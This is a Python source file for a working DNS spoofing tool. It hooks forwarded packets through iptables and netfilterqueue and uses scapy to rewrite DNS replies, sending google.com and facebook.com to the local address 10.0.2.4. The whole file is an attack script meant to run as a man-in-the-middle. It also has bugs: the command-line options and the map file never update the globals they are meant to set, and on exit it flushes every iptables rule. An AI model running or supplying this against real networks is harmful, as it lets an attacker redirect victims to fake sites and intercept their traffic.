from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "10.0.2.4",
    b"google.com.": "10.0.2.4",
    b"facebook.com.": "10.0.2.4"
}
filename = "map.txt"
queue_num = 0
use_print = True

def resolve_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", dest = "file", help = "File with replacement map, default map.txt")
    parser.add_argument("-q", "--queue", dest = "queue", help = "Queuenumber of netfilterqueue, default 0")
    parser.add_argument("-p", "--print", dest = "use_print", help = "Print actions, default 1 (0 | 1)")
    options = parser.parse_args()
    if options.file:
        filename = options.file
    if options.queue:
        queue_num = options.queue
    if options.use_print:
        if options.use_print == 0:
            use_print = False
    return options

def setup_map():
    mapfile = open(filename, 'r')
    lines = mapfile.readlines()

    dns_hosts = {}
    for line in lines:
        parts = line.split("-")
        print(line)
        print(parts)
        print()
        dns_hosts[bytes(parts[0], 'utf-8')] = parts[1]
    print(dns_hosts)
    mapfile.close()

def iPrint(text, second=None):
    if(use_print):
        if(second==None):
            print(text)
        else:
            print(text, second)

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        iPrint("Packet received:")
        iPrint("[IP Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            iPrint("IndexError occured")
            pass
        iPrint("[IP After ]:", scapy_packet.summary())
        iPrint("")
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        iPrint("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    iPrint("Modified:", qname)
    # return the modified packet
    return packet


if __name__ == "__main__":
    resolve_args()
    setup_map()
    # insert the iptables FORWARD rule
    iPrint("Setting up forwarding rule in iptables")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(queue_num))

    iPrint("DNS spoofing map:")
    iPrint(dns_hosts)
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(queue_num, process_packet)
        iPrint("Starting DNS spoofing")
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        iPrint("Flushing iptables, removing the forwarding rule")
        os.system("iptables --flush")
        iPrint("Program done")